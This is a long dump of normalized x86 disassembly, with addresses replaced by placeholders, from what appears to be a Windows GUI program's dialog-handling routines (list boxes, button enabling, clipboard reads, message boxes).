mov [ esp + 0x7c ] 0x0
cmp [ esp + 0xac ] 0x10
mov edi [ esp + 0x98 ]
mov [ esp + 0x102a8 ] 0x7
jae r-xdata
mov eax [ esp + 0x74 ]
mov ecx [ esp + 0x60 ]
mov esi 0x10
cmp eax esi
jae r-xdata
lea ecx [ esp + 0x278 ]
call sub_450270
cmp eax 0x3c
jne r-xdata
cmp [ esp + 0x14 ] edx
je r-xdata
cmp edx ebp
jb r-xdata
cmp edx ebp
mov ecx edx
jb r-xdata
mov edx [ esp + 0x70 ]
test edx edx
je r-xdata
mov ecx [ esp + 0x27c ]
push ecx
lea edx [ esp + 0x17c ]
push r--data
push edx
call [ wsprintfA@IAT ]
lea eax [ esp + 0x184 ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov [ esp + 0x3c ] 0x0
jmp r-xdata
cmp ebp edx
je r-xdata
mov [ esp + 0xac ] 0xf
mov [ esp + 0xa8 ] 0x0
mov [ esp + 0x98 ] 0x0
mov eax [ esp + 0x98 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ esp + 0x3c ]
mov eax [ esp + 0xa8 ]
cmp ecx 0x1
setg bl
xor esi esi
test eax eax
jle r-xdata
lea edi [ esp + 0x98 ]
cmp [ esp + 0x100 ] esi
mov eax [ esp + 0xec ]
jae r-xdata
lea ecx [ esp + 0x60 ]
mov edx [ esp + 0x27c ]
push edx
lea eax [ esp + 0x17c ]
push r--data
push eax
call [ wsprintfA@IAT ]
lea eax [ esp + 0x184 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
lea ecx [ esp + 0x278 ]
call sub_450380
cmp [ esp + 0x74 ] 0x10
mov edi [ esp + 0x10284 ]
mov [ esp + 0x102a8 ] 0x3
jb r-xdata
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x108 ]
inc ecx
mov [ esp + 0x14 ] ecx
add ebx 0x1c
jmp r-xdata
xor eax eax
cmp edx ebp
setne al
test eax eax
je r-xdata
cmp [ esp + 0x74 ] 0x10
mov esi [ esp + 0x60 ]
jae r-xdata
mov ecx ebp
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea eax [ esp + 0x17c ]
push eax
lea ecx [ esp + 0x48 ]
call sub_401cc0
push r--data
lea ecx [ esp + 0x24 ]
push ecx
lea edx [ esp + 0xc4 ]
push edx
call sub_402140
add esp 0xc
push 0xffffffff
push 0x0
push eax
lea ecx [ esp + 0x4c ]
mov [ esp + 0x102b4 ] 0x8
call sub_4018c0
mov eax [ esp + 0xd4 ]
mov esi 0x10
cmp eax esi
jb r-xdata
test bl bl
jne r-xdata
lea esp [ esp ]
push ecx
push eax
mov eax [ esp + 0x284 ]
push eax
lea ecx [ esp + 0x184 ]
push r--data
push ecx
call [ wsprintfA@IAT ]
lea eax [ esp + 0x18c ]
add esp 0x14
lea edx [ eax + 0x1 ]
lea eax [ esp + 0xec ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea ecx [ esp + 0x17c ]
push ecx
lea ecx [ esp + 0x48 ]
call sub_401cc0
mov eax r--data
lea edx [ eax + 0x1 ]
mov [ esp + 0x74 ] 0xf
mov [ esp + 0x70 ] 0x0
mov [ esp + 0x60 ] 0x0
jmp r-xdata
mov edx [ esp + 0x60 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
test eax eax
jne r-xdata
xor eax eax
[ esi ] [ edi ]
je r-xdata
lea esi [ esp + 0x60 ]
lea ecx [ esp + 0xd8 ]
mov [ esp + 0x102a8 ] 0x2
call sub_413c10
cmp [ esp + 0x38 ] esi
jb r-xdata
mov eax [ esp + 0xc0 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov eax [ esp + 0x158 ]
mov [ eax + ebp ] bl
cmp [ esp + 0x90 ] 0x10
mov [ esp + 0x102a8 ] 0x6
jb r-xdata
cmp [ esp + 0x90 ] 0x10
mov eax [ esp + 0x7c ]
jae r-xdata
cmp al 0xe0
jb r-xdata
cmp al 0x9f
jbe r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea edx [ esp + 0x17c ]
push edx
lea ecx [ esp + 0x48 ]
call sub_401cc0
cmp [ esp + 0x74 ] esi
jb r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x48 ]
call sub_401cc0
mov eax [ esp + 0x74 ]
mov esi 0x10
cmp eax esi
jb r-xdata
mov ebp [ esp + 0x14 ]
test eax eax
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
mov ecx [ esp + 0x24 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
jmp r-xdata
mov ebx [ esp + 0x14 ]
mov [ esp + 0x90 ] 0xf
mov [ esp + 0x8c ] 0x0
mov [ esp + 0x7c ] 0x0
mov ecx [ esp + 0x7c ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov edx [ esp + 0x8c ]
add edx 0xfffffffe
push edx
inc eax
push eax
lea ecx [ esp + 0x9c ]
call sub_401e80
lea eax [ esp + 0x7c ]
cmp al 0x5c
jne r-xdata
cmp al 0xff
ja r-xdata
mov [ esp + 0xb4 ] al
mov ecx [ esp + 0xb4 ]
push ecx
push 0x1
lea ecx [ esp + 0x80 ]
call sub_4017f0
mov dl [ esi + edi + 0x1 ]
inc esi
mov [ esp + 0xb8 ] dl
mov eax [ esp + 0xb8 ]
push eax
jmp r-xdata
lea ecx [ esp + 0xd8 ]
mov [ esp + 0x74 ] 0xf
mov [ esp + 0x70 ] 0x0
mov [ esp + 0x60 ] 0x0
mov [ esp + 0x102a8 ] 0x2
call sub_413c10
cmp [ esp + 0x38 ] esi
jb r-xdata
mov eax [ esp + 0x60 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
lea ecx [ esp + 0xd8 ]
mov [ esp + 0x74 ] 0xf
mov [ esp + 0x70 ] 0x0
mov [ esp + 0x60 ] 0x0
mov [ esp + 0x102a8 ] 0x2
call sub_413c10
cmp [ esp + 0x38 ] esi
jb r-xdata
mov edx [ esp + 0x60 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov [ esp + 0xb0 ] al
mov ecx [ esp + 0xb0 ]
push ecx
cmp [ esi + edi + 0x1 ] 0x6e
jne r-xdata
lea ecx [ esp + 0x7c ]
push 0x1
call sub_4017f0
mov ecx [ esp + 0x24 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
jmp r-xdata
mov eax [ esp + 0x24 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
jmp r-xdata
mov al [ esi + edi ]
cmp al 0x80
jb r-xdata
cmp al 0x5c
jne r-xdata
push 0xd
push 0x1
lea ecx [ esp + 0x80 ]
call sub_4017f0
inc esi
push 0xa
jmp r-xdata
cmp [ esi + edi + 0x1 ] 0x22
jne r-xdata
cmp al 0x5c
jne r-xdata
test bl bl
jne r-xdata
cmp [ esi + edi + 0x1 ] al
jne r-xdata
push 0x22
push 0x1
lea ecx [ esp + 0x80 ]
call sub_4017f0
inc esi
jmp r-xdata
test bl bl
jne r-xdata
mov eax [ esp + 0xa8 ]
inc esi
cmp esi eax
jl r-xdata
push 0x5c
push 0x1
lea ecx [ esp + 0x80 ]
call sub_4017f0
inc esi
jmp r-xdata
sub_419810
mov eax [ esp + 0x4 ]
sub esp 0x104
push ebx
push esi
push edi
mov edi [ rw-data ]
xor ebx ebx
cmp edi ebx
je r-xdata
mov ecx [ esp + 0x118 ]
cmp [ ecx + 0x18 ] 0x10
jb r-xdata
mov ecx [ rw-data ]
cmp ecx eax
jne r-xdata
add ecx 0x4
mov ecx [ ecx + 0x4 ]
jmp r-xdata
push ebp
mov ebp [ GetDlgItem@IAT ]
mov [ esp + 0x10 ] ebx
pop edi
pop esi
pop ebx
add esp 0x104
retn
push 0x1
push 0x0
push 0xffffffff
push 0xffffffff
call sub_40ef30
mov al [ esp + 0x12c ]
add esp 0x10
test al al
push 0x1
push 0xffffffff
je r-xdata
shl eax 0x4
add eax rw-data
push eax
push ecx
call sub_4189f0
mov esi [ rw-data ]
add esp 0x8
test esi esi
je r-xdata
mov edx [ eax + 0x8 ]
sub edx esi
mov eax 0x66666667
imul edx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
push 0x4ce
push 0x4cd
jmp r-xdata
shl ecx 0x4
add ecx rw-data
call sub_414f80
push 0x0
push 0x3eb
push edi
call ebp
mov esi [ EnableWindow@IAT ]
push eax
call esi
push 0x0
push 0x3ec
push edi
call ebp
push eax
call esi
push 0x0
push 0x3ed
push edi
call ebp
push eax
call esi
push 0x0
push 0x3ee
push edi
call ebp
push eax
call esi
push 0x0
push 0x3f0
push edi
call ebp
push eax
call esi
mov eax [ esp + 0x118 ]
pop ebp
push 0x0
push 0x0
push 0x182
push 0x3e9
push edi
call ebp
push eax
call [ SendMessageA@IAT ]
mov ecx [ rw-data ]
mov edx ecx
shl edx 0x4
mov eax [ edx + rw-data ]
mov eax [ eax + ebx + 0xc ]
test eax eax
je r-xdata
cmp [ esp + 0x10 ] edx
jge r-xdata
push edx
lea ecx [ esp + 0x14 ]
push r--data
push ecx
call [ wsprintfA@IAT ]
add esp 0xc
lea edx [ esp + 0x10 ]
push edx
push 0x0
push 0xc
push 0x3f2
push esi
call [ SendDlgItemMessageA@IAT ]
mov ecx [ eax + 0x8 ]
sub ecx edx
mov eax 0x66666667
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
push esi
call [ SendMessageA@IAT ]
mov eax [ rw-data ]
shl eax 0x4
add eax rw-data
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
inc [ esp + 0x10 ]
add ebx 0xa0
jmp r-xdata
push eax
call [ DestroyWindow@IAT ]
mov ecx [ rw-data ]
shl ecx 0x4
mov edx [ ecx + rw-data ]
mov [ edx + ebx + 0xc ] 0x0
mov ecx [ rw-data ]
mov eax ecx
shl eax 0x4
add eax rw-data
mov esi [ eax + 0x4 ]
test esi esi
jne r-xdata
sub_419a00
mov eax [ rw-data ]
push esi
mov esi [ esp + 0x8 ]
cmp eax esi
je r-xdata
pop esi
retn
cmp [ rw-data ] 0x14
mov [ rw-data ] esi
jne r-xdata
push 0x1
push 0x0
push 0xffffffff
push 0xffffffff
call sub_40ef30
add esp 0x10
push edi
mov edi [ rw-data ]
test edi edi
jne r-xdata
mov ecx [ rw-data ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
pop edi
imul esi esi 0x70
mov ecx [ esi + edi + 0x68 ]
test ecx ecx
lea eax [ esi + edi ]
je r-xdata
cmp esi edx
jge r-xdata
push 0x0
add eax 0x54
push eax
push 0x14
call sub_419810
add esp 0xc
sub_419a80
mov eax [ esp + 0x4 ]
sub esp 0x208
push esi
mov esi [ lstrcpyA@IAT ]
push eax
lea ecx [ esp + 0x8 ]
push ecx
call esi
mov edx [ esp + 0x214 ]
push edx
lea eax [ esp + 0x10c ]
push eax
call esi
lea ecx [ esp + 0x4 ]
push ecx
call sub_458050
lea edx [ esp + 0x10c ]
push edx
call sub_458050
lea eax [ esp + 0xc ]
push eax
call sub_40e060
add esp 0xc
test eax eax
jne r-xdata
lea ecx [ esp + 0x4 ]
push edi
push ecx
call sub_40f790
add esp 0x4
mov edi rw-data
mov esi rw-data
pop esi
add esp 0x208
retn
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push 0x1
push 0x0
push 0xffffffff
push 0xffffffff
call sub_40ef30
add esp 0x10
pop edi
mov [ rw-data ] 0x1
mov eax 0x1
pop esi
add esp 0x208
retn
push edi
push eax
call sub_4189f0
add esi 0x1c
add esp 0x8
add edi 0x10
cmp esi rw-data
jl r-xdata
sub_419b40
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4bf9ef
push eax
mov eax [ esp + 0x14 ]
mov [ fs : 0x0 ] esp
sub esp 0x258
cmp eax 0x4cd
push ebx
push ebp
push esi
push edi
ja r-xdata
cmp eax 0x4ce
jne r-xdata
je r-xdata
xor eax eax
mov eax [ esp + 0x278 ]
push 0x3e9
push eax
call [ GetDlgItem@IAT ]
xor ebp ebp
mov esi eax
mov [ esp + 0x2c ] 0xf
mov [ esp + 0x28 ] ebp
mov [ esp + 0x18 ] 0x0
mov eax [ esp + 0x280 ]
cmp eax 0xffffffff
mov [ esp + 0x270 ] 0x1
jne r-xdata
mov esi [ esp + 0x284 ]
mov eax [ esp + 0x280 ]
mov edi [ esp + 0x278 ]
push esi
push eax
push 0x4ce
push edi
call [ SendMessageA@IAT ]
xor ecx ecx
mov cl [ rw-data ]
test esi esi
setne dl
push ecx
push edx
push 0xfffffff8
push edi
call [ GetWindowLongA@IAT ]
push eax
call sub_47e8e0
add esp 0xc
jmp r-xdata
sub eax 0x110
je r-xdata
mov ebp eax
inc eax
mov [ esp + 0x10 ] eax
mov eax [ rw-data ]
shl eax 0x4
add eax rw-data
mov edx [ eax + 0x4 ]
cmp edx ebp
jne r-xdata
mov al [ rw-data ]
test al al
mov esi [ esp + 0x278 ]
je r-xdata
dec eax
jne r-xdata
push 0x0
push 0x1
push 0xb
push esi
call edi
mov ecx [ esp + 0x30 ]
mov edx [ esp + 0x278 ]
push ecx
push 0x3e9
push edx
call [ GetDlgItem@IAT ]
push eax
call [ ReleaseDC@IAT ]
cmp [ esp + 0x2c ] 0x10
jb r-xdata
lea ecx [ ecx ]
mov ecx [ eax + 0x8 ]
sub ecx edx
mov eax 0x66666667
imul ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
mov [ esp + 0x10 ] edx
jmp r-xdata
mov [ esp + 0x10 ] ebp
jmp r-xdata
push 0x0
push 0x1
jmp r-xdata
mov esi [ esp + 0x280 ]
movzx eax si
cmp eax 0x3ee
jg r-xdata
mov eax [ esp + 0x18 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
push eax
push ebp
push 0x181
push esi
call edi
mov eax [ esp + 0x280 ]
cmp eax 0xffffffff
je r-xdata
lea eax [ esp + 0x18 ]
mov edi [ esp + 0x278 ]
mov ebx [ GetDlgItem@IAT ]
push 0x3e9
push edi
call ebx
push eax
call [ GetDC@IAT ]
lea edx [ esp + 0x34 ]
push edx
push 0x3e9
push edi
mov [ esp + 0x3c ] eax
call ebx
push eax
call [ GetClientRect@IAT ]
mov ebx [ esp + 0x3c ]
mov edx [ esp + 0x34 ]
mov edi [ SendMessageA@IAT ]
push 0x0
push 0x0
push 0xb
push esi
sub ebx edx
call edi
push 0x0
push 0x0
push 0x188
push esi
call edi
mov [ esp + 0x50 ] eax
cmp ebp [ esp + 0x10 ]
jge r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
push 0x3f5
push esi
call [ CheckDlgButton@IAT ]
mov ebx [ SendDlgItemMessageA@IAT ]
mov edi rw-data
mov ebp 0x10
sub eax 0x3ef
cmp eax 0xd
ja r-xdata
je r-xdata
cmp [ esp + 0x2c ] 0x10
mov eax [ esp + 0x18 ]
jae r-xdata
mov ecx [ esp + 0x50 ]
cmp eax ecx
jne r-xdata
cmp [ edi + 0x14 ] ebp
jb r-xdata
mov ebp [ GetDlgItem@IAT ]
push 0x6
push 0xc8
push 0x104
push 0x0
push 0x0
push 0x0
push 0x3fc
push esi
call ebp
push eax
call [ SetWindowPos@IAT ]
mov edx [ rw-data ]
push 0x0
push edx
push 0x14e
push 0x3fc
push esi
call ebx
mov eax [ rw-data ]
shl eax 0x4
add eax rw-data
push eax
mov ecx rw-data
call sub_416c00
push 0x3f1
push esi
call ebp
mov edi eax
mov eax [ rw-data ]
test eax eax
jne r-xdata
push eax
push 0x0
push 0x143
push 0x3fc
push esi
call ebx
add edi 0x1c
cmp edi rw-data
jl r-xdata
jmp [ eax * 4 + jump_table_41b628 ]
mov ecx [ esp + 0x278 ]
push 0x3e9
push ecx
call [ GetDlgItem@IAT ]
mov edi [ SendMessageA@IAT ]
push 0x0
push 0x0
mov ebp eax
push 0x188
push ebp
call edi
mov ebx eax
mov [ esp + 0x2c ] 0xf
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x18 ] 0x0
lea ecx [ esp + 0x68 ]
mov [ esp + 0x270 ] 0x7
call sub_413b80
push 0x0
lea eax [ ebx + 0x1 ]
push eax
push 0x18a
push ebp
mov [ esp + 0x280 ] 0x8
mov [ esp + 0x20 ] eax
call edi
push eax
lea ecx [ esp + 0x18 ]
call sub_401f60
cmp [ esp + 0x2c ] 0x10
mov eax [ esp + 0x18 ]
jae r-xdata
cmp eax 0x3ea
jg r-xdata
mov edx [ esp + 0x28 ]
lea ecx [ esp + 0x58 ]
push ecx
push edx
push eax
mov eax [ esp + 0x3c ]
push eax
call [ GetTextExtentPoint32A@IAT ]
mov eax [ esp + 0x58 ]
cmp ebx eax
jge r-xdata
lea eax [ esp + 0x18 ]
push 0x0
mov edx eax
push edx
push 0x186
push esi
call edi
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x66666667
imul ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
mov ebp [ esp + 0x278 ]
mov ebx [ GetDlgItem@IAT ]
push 0x3e9
push ebp
call ebx
mov esi [ rw-data ]
mov ecx esi
shl ecx 0x4
add ecx rw-data
mov [ esp + 0x30 ] eax
mov [ esp + 0x10 ] 0x0
call sub_40af70
test eax eax
jle r-xdata
mov esi [ esp + 0x278 ]
mov ebx [ GetDlgItem@IAT ]
push 0x0
push 0x0
push 0x188
push 0x3e8
push esi
call ebx
mov edi [ SendMessageA@IAT ]
push eax
call edi
mov edx [ rw-data ]
mov ecx [ rw-data ]
lea eax [ eax + eax * 4 ]
shl eax 0x5
add eax edx
shl ecx 0x4
push eax
add ecx rw-data
call sub_416dc0
mov [ esp + 0x2c ] 0xf
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x18 ] 0x0
mov ecx [ rw-data ]
shl ecx 0x4
push 0x1
add ecx rw-data
mov [ esp + 0x274 ] 0x4
call sub_40af70
dec eax
push eax
lea ecx [ esp + 0x1c ]
push ecx
call sub_410cb0
add esp 0xc
push 0x3e9
push esi
call ebx
mov ebx eax
cmp [ esp + 0x2c ] 0x10
mov eax [ esp + 0x18 ]
jae r-xdata
mov ecx [ esp + 0x278 ]
push 0x3e9
push ecx
call [ GetDlgItem@IAT ]
mov ebp [ SendMessageA@IAT ]
push 0x0
push 0x0
mov edi eax
push 0x188
push edi
call ebp
mov edx [ rw-data ]
mov esi eax
shl edx 0x4
mov eax [ edx + rw-data ]
lea ebx [ esi + esi * 4 ]
shl ebx 0x5
mov cl [ ebx + eax + 0x4 ]
test cl cl
sete cl
mov [ ebx + eax + 0x4 ] cl
mov [ esp + 0x2c ] 0xf
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x18 ] 0x0
push 0x1
lea edx [ esp + 0x18 ]
push esi
push edx
mov [ esp + 0x27c ] 0x9
call sub_410cb0
add esp 0xc
push 0x0
push esi
push 0x182
push edi
call ebp
cmp [ esp + 0x2c ] 0x10
mov eax [ esp + 0x18 ]
jae r-xdata
mov al [ rw-data ]
test al al
mov eax [ esp + 0x278 ]
sete dl
push 0x1
mov [ rw-data ] dl
push 0x0
jmp r-xdata
mov ebx [ rw-data ]
mov ecx ebx
shl ecx 0x4
add ecx rw-data
mov [ esp + 0x10 ] 0x0
call sub_40af70
test eax eax
mov esi [ esp + 0x278 ]
mov edi [ GetDlgItem@IAT ]
jle r-xdata
mov [ esp + 0x2c ] 0xf
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x18 ] 0x0
mov eax [ rw-data ]
push 0x1
lea edx [ esp + 0x18 ]
push edx
push eax
mov [ esp + 0x27c ] 0xa
call sub_4135e0
mov ecx [ esp + 0x34 ]
add esp 0xc
inc ecx
push ecx
push 0x42
call [ GlobalAlloc@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
mov [ esp + 0x2c ] 0xf
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x18 ] 0x0
push 0x1
mov [ esp + 0x274 ] 0xb
call [ IsClipboardFormatAvailable@IAT ]
test eax eax
push 0x0
jne r-xdata
mov [ esp + 0x4c ] 0xf
mov [ esp + 0x48 ] 0x0
mov [ esp + 0x38 ] 0x0
shr esi 0x10
dec esi
mov [ esp + 0x270 ] 0xc
je r-xdata
mov edx [ esp + 0x10 ]
push eax
push edx
push 0x189
push ebp
call edi
mov eax [ rw-data ]
shl eax 0x4
mov eax [ eax + rw-data ]
lea esi [ ebx + ebx * 4 ]
shl esi 0x5
lea eax [ esi + eax + 0xa0 ]
push eax
lea ecx [ esp + 0x6c ]
call sub_414c30
mov ecx [ esp + 0x10 ]
push 0x0
push ecx
push 0x182
push ebp
call edi
mov edx [ rw-data ]
shl edx 0x4
mov eax [ edx + rw-data ]
lea edx [ esi + eax ]
lea ecx [ esi + eax + 0xa0 ]
push edx
call sub_414c30
cmp [ esp + 0x2c ] 0x10
mov eax [ esp + 0x18 ]
jae r-xdata
lea eax [ esp + 0x18 ]
sub eax 0x3eb
je r-xdata
je r-xdata
mov eax [ esp + 0x10 ]
inc ebp
cmp ebp eax
jl r-xdata
push 0x0
push eax
push 0x194
push esi
mov ebx eax
call edi
mov ecx [ rw-data ]
sub ecx ebx
mov eax 0x66666667
imul ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
push edx
lea edx [ esp + 0x16c ]
push r--data
push edx
call [ wsprintfA@IAT ]
add esp 0xc
lea eax [ esp + 0x168 ]
push eax
push 0x0
push 0xc
push edi
call [ SendMessageA@IAT ]
push 0x3e8
push esi
call ebp
mov [ esp + 0x50 ] eax
mov [ esp + 0x10 ] 0x0
xor edi edi
nop
mov ecx esi
shl ecx 0x4
push rw-data
add ecx rw-data
call sub_416c00
push 0x3f2
push ebp
call ebx
mov ecx [ rw-data ]
shl ecx 0x4
add ecx rw-data
mov esi eax
call sub_40af70
push eax
lea edx [ esp + 0x6c ]
push r--data
push edx
call [ wsprintfA@IAT ]
add esp 0xc
lea eax [ esp + 0x68 ]
push eax
push 0x0
push 0xc
push esi
call [ SendMessageA@IAT ]
push 0x3e9
push ebp
call ebx
mov ecx [ rw-data ]
shl ecx 0x4
add ecx rw-data
mov edi eax
xor esi esi
call sub_40af70
test eax eax
jle r-xdata
xor edi edi
lea ebx [ ebx ]
push eax
push 0x0
push 0x180
push ebx
call edi
mov ecx [ rw-data ]
shl ecx 0x4
push 0x0
add ecx rw-data
call sub_40af70
dec eax
push eax
push 0x186
push ebx
call edi
push ebx
push 0x103e9
push 0x111
push esi
call edi
mov ecx [ rw-data ]
push 0x1
push 0x0
shl ecx 0x4
push 0xffffffff
add ecx rw-data
call sub_40af70
dec eax
push eax
call sub_40ef30
mov edx [ rw-data ]
shl edx 0x4
mov eax [ edx + rw-data ]
mov cl [ eax - 0x9c ]
add esp 0x10
test cl cl
jne r-xdata
lea eax [ esp + 0x18 ]
push eax
push esi
push 0x181
push edi
call ebp
push 0x0
push esi
push 0x186
push edi
call ebp
mov eax [ esp + 0x278 ]
push edi
push 0x103e9
push 0x111
push eax
call ebp
mov ecx [ rw-data ]
shl ecx 0x4
mov edx [ ecx + rw-data ]
mov eax [ edx + ebx + 0xc ]
test eax eax
lea ecx [ edx + ebx ]
je r-xdata
lea eax [ esp + 0x18 ]
push 0xfffffff8
push eax
call [ GetWindowLongA@IAT ]
push eax
call sub_47e8e0
add esp 0xc
jmp r-xdata
mov ecx ebx
shl ecx 0x4
add ecx rw-data
call sub_414f80
push 0x0
push 0x3eb
push esi
call edi
mov ebx [ EnableWindow@IAT ]
push eax
call ebx
push 0x0
push 0x3ec
push esi
call edi
push eax
call ebx
push 0x0
push 0x3ed
push esi
call edi
push eax
call ebx
push 0x0
push 0x3ee
push esi
call edi
push eax
call ebx
push 0x0
push 0x3f0
push esi
call edi
push eax
call ebx
mov ecx [ rw-data ]
shl ecx 0x4
add ecx rw-data
call sub_40af70
push eax
lea edx [ esp + 0x6c ]
push r--data
push edx
call [ wsprintfA@IAT ]
add esp 0xc
lea eax [ esp + 0x68 ]
push eax
push 0x0
push 0xc
push 0x3e9
push esi
call [ SendDlgItemMessageA@IAT ]
xor ecx ecx
mov cl [ rw-data ]
push ecx
push 0x1
push 0xfffffff8
push esi
call [ GetWindowLongA@IAT ]
push eax
call sub_47e8e0
add esp 0xc
jmp r-xdata
xor ebp ebp
lea esp [ esp ]
push ebx
call [ GlobalLock@IAT ]
cmp [ esp + 0x2c ] 0x10
mov esi [ esp + 0x18 ]
jae r-xdata
mov edx [ esp + 0x278 ]
push eax
push r--data
push r--data
push edx
call [ MessageBoxA@IAT ]
lea ecx [ esp + 0x14 ]
call sub_4480e0
jmp r-xdata
call [ OpenClipboard@IAT ]
push 0x1
call [ GetClipboardData@IAT ]
mov esi eax
test esi esi
je r-xdata
mov edx [ esp + 0x27c ]
push r--data
push r--data
push edx
call [ MessageBoxA@IAT ]
lea ecx [ esp + 0x14 ]
call sub_4480e0
jmp r-xdata
mov esi [ esp + 0x278 ]
mov edi [ SendDlgItemMessageA@IAT ]
push 0x0
push 0x0
push 0x147
push 0x3fc
push esi
call edi
push eax
call sub_413350
mov edx [ rw-data ]
shl edx 0x4
add esp 0x4
add edx rw-data
push edx
mov ecx rw-data
call sub_416c00
mov ecx [ rw-data ]
shl ecx 0x4
add ecx rw-data
call sub_40af70
push eax
lea eax [ esp + 0x16c ]
push r--data
push eax
call [ wsprintfA@IAT ]
add esp 0xc
lea ecx [ esp + 0x168 ]
push ecx
push 0x0
push 0xc
push 0x3f2
push esi
call edi
sub esi 0x4
jne r-xdata
push eax
push ebx
push 0x181
push ebp
call edi
mov eax [ rw-data ]
shl eax 0x4
mov eax [ eax + rw-data ]
lea edx [ esp + 0x68 ]
lea ecx [ esi + eax ]
push edx
call sub_414c30
mov eax [ esp + 0x278 ]
push ebp
push 0x103e9
push 0x111
push eax
call edi
mov ecx [ rw-data ]
mov edx ecx
shl edx 0x4
mov eax [ edx + rw-data ]
mov edx [ esi + eax + 0xc ]
test edx edx
je r-xdata
lea eax [ esp + 0x18 ]
mov ebx [ esp + 0x278 ]
push 0x0
push 0x0
push 0x188
push 0x3e9
push ebx
call [ GetDlgItem@IAT ]
push eax
call [ SendMessageA@IAT ]
mov edi eax
mov eax [ rw-data ]
mov ecx eax
shl ecx 0x4
mov ebp [ ecx + rw-data ]
lea esi [ edi + edi * 4 ]
shl esi 0x5
mov ecx [ esi + ebp + 0xc ]
test ecx ecx
jne r-xdata
dec eax
je r-xdata
mov edx [ esp + 0x278 ]
push 0x0
push 0x0
push 0x188
push 0x3e8
push edx
call [ GetDlgItem@IAT ]
mov ebp [ SendMessageA@IAT ]
push eax
call ebp
mov esi [ rw-data ]
shl esi 0x4
lea esi [ esi + rw-data ]
mov ecx esi
mov [ esp + 0x30 ] eax
call sub_40af70
inc eax
push eax
mov ecx esi
call sub_416d90
mov ebx [ rw-data ]
mov ecx ebx
shl ecx 0x4
add ecx rw-data
call sub_40af70
mov edi eax
dec edi
cmp edi 0x1
jl r-xdata
cmp eax 0x3e8
jg r-xdata
push 0x1
lea eax [ esp + 0x18 ]
push ebp
push eax
call sub_410cb0
add esp 0xc
push 0x0
push ebp
push 0x182
push esi
call edi
cmp [ esp + 0x2c ] 0x10
mov eax [ esp + 0x18 ]
jae r-xdata
push 0x0
push 0x3ea
push esi
call ebp
mov edi [ EnableWindow@IAT ]
push eax
call edi
push 0x0
push 0x3ef
push esi
call ebp
push eax
call edi
push 0x3f2
push esi
call ebp
mov edi eax
mov eax [ rw-data ]
shl eax 0x4
add eax rw-data
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
cmp [ edi + ebx + 0x28 ] 0x10
jb r-xdata
cmp [ esp + 0x10 ] edx
jge r-xdata
push 0x0
push 0x3eb
push ebp
call ebx
mov esi [ EnableWindow@IAT ]
push eax
call esi
push 0x0
push 0x3ec
push ebp
call ebx
push eax
call esi
push 0x0
push 0x3ed
push ebp
call ebx
push eax
call esi
push 0x0
push 0x3ee
push ebp
call ebx
push eax
call esi
push 0x0
push 0x3f0
push ebp
call ebx
push eax
call esi
push 0x1
push 0x0
push 0xffffffff
push 0xffffffff
call sub_40ef30
mov eax [ rw-data ]
add esp 0x10
xor edx edx
mov dl [ rw-data ]
push edx
push 0x1
mov edi edi
mov edx [ esp + 0x10 ]
mov ecx esi
shl ecx 0x4
inc edx
add ecx rw-data
mov [ esp + 0x10 ] edx
add edi 0xa0
call sub_40af70
cmp [ esp + 0x10 ] eax
jl r-xdata
push ecx
call [ DestroyWindow@IAT ]
mov esi [ rw-data ]
mov ecx [ rw-data ]
shl ecx 0x4
add ecx rw-data
call sub_40af70
push eax
lea edx [ esp + 0x6c ]
push r--data
push edx
call [ wsprintfA@IAT ]
add esp 0xc
lea eax [ esp + 0x68 ]
push eax
push 0x0
push 0xc
push 0x3f2
push esi
call [ SendDlgItemMessageA@IAT ]
lea ecx [ esp + 0x14 ]
call sub_4480e0
jmp r-xdata
xor ecx ecx
mov cl [ rw-data ]
push ecx
push 0x1
push 0xfffffff8
push esi
call [ GetWindowLongA@IAT ]
push eax
call sub_47e8e0
add esp 0xc
mov ecx [ esp + 0x278 ]
xor eax eax
mov al [ rw-data ]
push eax
push 0x1
push 0xfffffff8
push ecx
call [ GetWindowLongA@IAT ]
push eax
call sub_47e8e0
add esp 0xc
lea ecx [ esp + 0x14 ]
call sub_4480e0
jmp r-xdata
mov dl [ ecx + 0x4 ]
test dl dl
je r-xdata
